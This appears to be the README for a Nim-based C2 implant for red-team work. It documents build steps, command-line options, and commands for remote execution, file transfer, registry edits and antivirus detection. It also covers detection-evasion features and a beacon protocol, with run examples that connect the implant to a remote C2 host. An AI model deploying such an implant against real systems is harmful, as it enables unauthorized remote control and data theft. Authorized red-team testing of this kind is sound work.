# Nimplant - Nim-based C2 Implant

A cross-platform implant written in Nim for the SCYTHE C2 framework, providing advanced red team capabilities with minimal footprint and high performance.

## Features

### Core Functionality
- **Cross-platform compatibility** - Windows, Linux, macOS
- **HTTP/HTTPS C2 communication** with configurable endpoints
- **Jitter and sleep configuration** for evasion
- **Base64 encoding/decoding** for data obfuscation
- **File upload/download capabilities**
- **System information gathering**
- **Command execution and output capture**

### Platform-Specific Features

#### Windows
- **Registry manipulation** (query/add operations)
- **Anti-virus detection** via WMI queries
- **Windows API integration** via winim

#### Unix/Linux
- **Process enumeration**
- **File system operations**
- **Environment variable access**

### Security Features
- **User-agent spoofing** for HTTP requests
- **Error handling and resilience** with automatic retry
- **Anti-detection techniques** through randomized timing
- **Minimal dependencies** for reduced attack surface

## Building

### Prerequisites
- Nim compiler (1.4.0 or later)
- Cross-compilation tools for target platforms

### Quick Build
```bash
# Build for current platform
./build.sh

# Build for specific platform
./build.sh windows
./build.sh linux
./build.sh macos

# Build for all platforms
./build.sh all

# Build with debug symbols
./build.sh linux --debug
```

### Manual Compilation
```bash
# Linux x64
nim c --opt:speed --define:release --out:nimplant_linux main.nim

# Windows x64 (cross-compile)
nim c --cpu:amd64 --os:windows --define:mingw --out:nimplant.exe main.nim

# macOS x64
nim c --cpu:amd64 --os:macosx --out:nimplant_macos main.nim
```

## Usage

### Command Line Options
```bash
nimplant [options]

Options:
  -h, --host <host>     C2 server host (default: 127.0.0.1)
  -p, --port <port>     C2 server port (default: 8080)
  --https               Use HTTPS instead of HTTP
  -s, --sleep <sec>     Sleep interval in seconds (default: 5)
  -j, --jitter <pct>    Jitter percentage (default: 20)
  --help                Show help message
```

### Examples
```bash
# Connect to local C2 server
./nimplant

# Connect to remote HTTPS C2 server
./nimplant -h c2.example.com -p 443 --https

# Custom sleep and jitter settings
./nimplant -h 192.168.1.100 -s 10 -j 30
```

## Supported Commands

### System Information
- `whoami` - Get current username
- `hostname` - Get computer hostname
- `pwd` - Get current working directory
- `env` - List environment variables
- `sysinfo` - Comprehensive system information

### File Operations
- `ls [dir]` / `dir [dir]` - List directory contents
- `cat <file>` / `type <file>` - Read file contents
- `cd <dir>` - Change directory
- `cp <src> <dst>` - Copy files/directories
- `upload <fileId> <name> [path]` - Download file from C2

### Windows-Specific
- `getav` - Detect installed antivirus software
- `reg <command> <path> [key] [value]` - Registry operations
  - `reg query HKLM\Software\Microsoft key`
  - `reg add HKCU\Software\Test key value`

### Process & System
- `ps` / `processes` - List running processes (limited)
- `sleep <seconds>` - Update sleep interval
- `jitter <percentage>` - Update jitter percentage
- `exit` / `quit` - Shutdown implant

### Generic Command Execution
Any command not recognized as a built-in will be executed as a system command.

## Architecture

```
nimplant/
├── main.nim              # Main implant logic and C2 loop
├── util/
│   └── webClient.nim     # HTTP client and C2 communication
├── modules/
│   ├── whoami.nim        # Username identification
│   ├── getAV.nim         # Antivirus detection (Windows)
│   ├── upload.nim        # File download from C2
│   ├── copy.nim          # File/directory copying
│   └── reg.nim           # Registry operations (Windows)
├── build.sh              # Build script for all platforms
└── nimplant.nim.cfg      # Nim compiler configuration
```

### Core Components

#### WebClient (`util/webClient.nim`)
- HTTP/HTTPS communication with C2 server
- JSON payload handling
- File upload/download functionality
- Configurable user agents and headers

#### Command Modules
Each module implements specific functionality:
- **whoami**: Windows API calls for user identification
- **getAV**: WMI queries for antivirus detection
- **upload**: File transfer from C2 to implant
- **copy**: Cross-platform file operations
- **reg**: Windows registry manipulation

## Protocol

### C2 Communication
The implant communicates with the C2 server using HTTP/HTTPS with JSON payloads:

#### Beacon Registration
```json
{
  "agent_id": "1640995200",
  "hostname": "DESKTOP-ABC123",
  "username": "user",
  "os": "windows",
  "arch": "amd64",
  "pwd": "C:\\Users\\user",
  "timestamp": 1640995200,
  "sleep": 5000,
  "jitter": 20
}
```

#### Task Request
```
GET /api/tasks?id=<agent_id>
```

#### Task Response
```json
{
  "tasks": [
    {
      "id": "task_123",
      "command": "whoami",
      "args": []
    }
  ]
}
```

#### Result Submission
```json
{
  "task_id": "task_123",
  "output": "DESKTOP-ABC123\\user",
  "success": true,
  "timestamp": 1640995260
}
```

## Dependencies

### Nim Packages
- **httpclient** - HTTP/HTTPS communication
- **json** - JSON parsing and generation
- **base64** - Data encoding/decoding
- **os** - File system operations
- **times** - Timestamp generation

### Windows Dependencies
- **winim** - Windows API bindings
- **registry** - Registry access

## Security Considerations

### Operational Security
- Randomized sleep intervals with jitter
- User-agent rotation capabilities
- Minimal logging and error output
- Clean shutdown procedures

### Detection Evasion
- Compiled binary has minimal runtime dependencies
- No persistence mechanisms (stealth-focused)
- Configurable C2 endpoints and protocols
- Error resilience with automatic retry

### Limitations
- No built-in encryption beyond HTTPS
- Limited persistence options
- Basic command execution (no advanced post-exploitation)

## Development

### Adding New Modules
1. Create new `.nim` file in `modules/` directory
2. Implement exported procedure with standard signature
3. Import module in `main.nim`
4. Add command mapping in `executeCommand()` function

### Example Module
```nim
# modules/example.nim
proc example*(args: varargs[string]): string =
  result = "Example output: " & $args.len & " arguments"
```

### Testing
```bash
# Build debug version
./build.sh linux --debug

# Test with local C2 server
./nimplant_linux_x64 -h 127.0.0.1 -p 8080 -s 1
```

## License

This project is part of the SCYTHE framework and follows the same licensing terms.

## Contributing

1. Follow Nim style guidelines
2. Add error handling for all external operations
3. Maintain cross-platform compatibility
4. Update documentation for new features

---

**Note**: This implant is designed for authorized security testing and red team operations only. Use responsibly and in accordance with applicable laws and regulations.